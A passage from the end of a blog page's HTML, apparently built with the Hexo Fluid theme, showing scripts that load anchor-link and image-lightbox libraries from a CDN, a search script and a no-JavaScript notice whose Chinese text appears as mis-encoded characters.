              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
            }, 2000);
          });
        });
      }
    });
  })();
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
